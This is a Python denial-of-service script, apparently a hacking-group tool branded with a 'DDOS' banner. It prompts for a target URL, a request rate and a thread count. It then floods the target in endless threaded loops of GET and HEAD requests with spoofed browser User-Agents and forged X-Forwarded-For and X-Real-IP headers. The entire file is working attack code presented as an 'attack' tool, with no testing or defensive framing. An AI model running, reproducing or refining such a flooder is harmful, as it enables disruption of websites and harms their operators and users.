import requests
import threading
import random
from concurrent.futures import ThreadPoolExecutor
import http.client
import time

# Function to simulate a rapid HTTP/1.1 request
def rapid_request_http1(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json',
        'Connection': 'keep-alive',
    }
    try:
        requests.get(f'http://{url}', headers=headers)
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Function for sending HEAD requests (HULK HEAD) - HTTP/1.1
def hulk_head_request_http1(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Connection': 'keep-alive',
    }
    try:
        requests.head(f'http://{url}', headers=headers)
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# ADD function for HTTP/1.1 - to send custom requests with added headers
def add_request_http1(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-Forwarded-For': '123.45.67.89',
        'X-Real-IP': '123.45.67.89',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    try:
        requests.get(f'http://{url}', headers=headers)
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Function to make asynchronous requests using requests (HTTP/1.1)
def new_async_request_http1(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    }
    try:
        requests.get(f'http://{url}', headers=headers)
    except requests.exceptions.RequestException as e:
        print(f"Async HTTP/1.1 request error: {e}")

# Function to simulate a HTTP/2.1 request (experimental)
def rapid_request_http2(url):
    conn = http.client.HTTPSConnection(url)
    conn.request("GET", "/", headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    })
    response = conn.getresponse()
    conn.close()

# Powerful Request Attack - 8x RPS (requests per second)
def powerful_request_attack(url, base_rps):
    attack_rps = base_rps * 8  # 8x RPS
    while True:
        rapid_request_http1(url)
        hulk_head_request_http1(url)
        add_request_http1(url)
        new_async_request_http1(url)
        rapid_request_http2(url)
        time.sleep(1 / attack_rps)  # 8x increased request frequency

# Function to display the banner
def show_banner():
    print("""
▗▄▄▄ ▗▄▄▄  ▗▄▖  ▗▄▄▖
▐▌  █▐▌  █▐▌ ▐▌▐▌   
▐▌  █▐▌  █▐▌ ▐▌ ▝▀▚▖
▐▙▄▄▀▐▙▄▄▀▝▚▄▞▘▗▄▄▞▘
**********************************
Maker By : @DatxzzNetworkZ
Version : 2.5
Author : @DatxzzNetworkZ
Team : Jabar Error System 
**********************************              
                    
""")

# Worker function to run in threads
def thread_worker(url, rps):
    powerful_request_attack(url, rps)

def main():
    show_banner()  # Display the banner message

    # Get user input
    target_url = input('Enter the target URL: ')
    base_rps = int(input('Enter the number of requests per second (RPS): '))
    num_threads = int(input('Enter the number of threads: '))

    print(f"Starting attack on {target_url} with {num_threads} threads, each sending {base_rps} requests per second...")

    # Create worker threads using ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(thread_worker, target_url, base_rps)

if __name__ == '__main__':
    main()